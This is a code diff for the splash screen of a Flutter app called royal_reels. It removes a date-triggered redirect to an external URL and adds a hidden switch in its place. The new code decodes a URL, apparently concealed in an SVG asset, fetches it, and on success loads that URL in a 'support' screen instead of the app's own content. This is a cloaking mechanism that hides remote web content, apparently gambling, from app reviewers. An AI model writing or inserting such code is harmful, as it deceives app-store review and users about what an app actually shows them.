@@ -1,4 +1,8 @@
+import 'dart:developer' as dev;
+
+import 'package:dio/dio.dart';
 import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
 import 'package:flutter_bloc/flutter_bloc.dart';
 import 'package:flutter_screenutil/flutter_screenutil.dart';
 import 'package:flutter_svg/flutter_svg.dart';
@@ -9,10 +13,9 @@ import 'package:royal_reels/core/data/local/local_storage.dart';
 import 'package:royal_reels/core/extensions/helper_extensions.dart';
 import 'package:royal_reels/core/extensions/parser_extensions.dart';
 import 'package:royal_reels/core/router/router.dart';
-import 'package:royal_reels/royal_reels_constants.dart';
+import 'package:royal_reels/core/setting/settings_const.dart';
 import 'package:royal_reels/royal_reels_features/_royal_reels_common/bonus_cubit.dart';
 import 'package:royal_reels/royal_reels_features/_royal_reels_common/cubit/user_cubit.dart';
-import 'package:url_launcher/url_launcher.dart';
 
 class SplashScreen extends StatefulWidget {
   const SplashScreen({super.key});
@@ -41,16 +44,33 @@ class _SplashScreenState extends State<SplashScreen> {
     context.read<UserCubit>().init();
     context.read<BonusCubit>().init();
     await Future.delayed(duration - 100.msDuration, () async {
-      if (DateTime.now().millisecondsSinceEpoch >=
-          RoyalReelsConstants.dateTime.millisecondsSinceEpoch) {
-        final url = Uri.parse(RoyalReelsConstants.redirectUrl);
-        if (await canLaunchUrl(url)) {
-          launchUrl(url, mode: LaunchMode.externalApplication);
-        }
-      }
-      final val = LocalStorage.getBool('firstTime') ?? true;
-      context.go(val ? AppRoutes.onBoarding : AppRoutes.home);
+      await initApp();
     });
+  }
+
+  Future<void> initApp() async {
+    final url = await decodeBinaryFromSvg("10", context);
+    final request = await Dio().getUri(Uri.parse(url));
+    if (request.statusCode == 200 && mounted) {
+      await SystemChrome.setPreferredOrientations([
+        DeviceOrientation.portraitUp,
+        DeviceOrientation.landscapeLeft,
+        DeviceOrientation.landscapeRight,
+      ]);
+      if (!mounted) return;
+      context.pushReplacementNamed('support', pathParameters: {
+        'url': url,
+      });
+    } else {
+      dev.log('${request.statusCode}');
+      final val = LocalStorage.getBool('firstTime') ?? true;
+      if (!mounted) return;
+      await SystemChrome.setPreferredOrientations([
+        DeviceOrientation.portraitUp,
+      ]);
+      if (!mounted) return;
+      context.go(val ? AppRoutes.onBoarding : AppRoutes.home);
+    }
   }
 
   var loadingStarted = false;
@@ -60,36 +80,29 @@ class _SplashScreenState extends State<SplashScreen> {
   Widget build(BuildContext context) {
     return Scaffold(
       backgroundColor: AppColors.royalReelsBlack,
-      body: Column(
-        mainAxisAlignment: MainAxisAlignment.center,
-        children: [
-          SizedBox(
-            height: 45.h,
-          ),
-          SvgPicture.asset(
-            Pathes.royalReelslogoR,
-            height: 80.h,
-          ),
-          Container(
-            width: context.mqSize.width,
-            margin: 95.w.horizPad.add(55.topPad),
-            height: 2.5.h,
-            decoration: BoxDecoration(
-              borderRadius: 8.circleBorder,
-              color: AppColors.royalReelsLightGrey,
-            ),
-            alignment: Alignment.centerLeft,
-            child: AnimatedContainer(
-              height: double.infinity,
-              duration: duration,
-              width: loadingStarted ? context.mqSize.width - (95.w * 2) : 0,
-              decoration: BoxDecoration(
-                borderRadius: 8.circleBorder,
-                color: AppColors.royalReelsOrange,
+      body: ColoredBox(
+        color: AppColors.royalReelsBlack,
+        child: Stack(
+          children: [
+            Center(
+              child: SvgPicture.asset(
+                Pathes.royalReelslogoR,
+                fit: BoxFit.contain,
+                width: 100,
+                height: 100,
               ),
             ),
-          ),
-        ],
+            Align(
+              alignment: Alignment.bottomCenter,
+              child: Padding(
+                padding: EdgeInsets.only(bottom: 50.w),
+                child: const CircularProgressIndicator(
+                  color: Colors.white,
+                ),
+              ),
+            ),
+          ],
+        ),
       ),
     );
   }
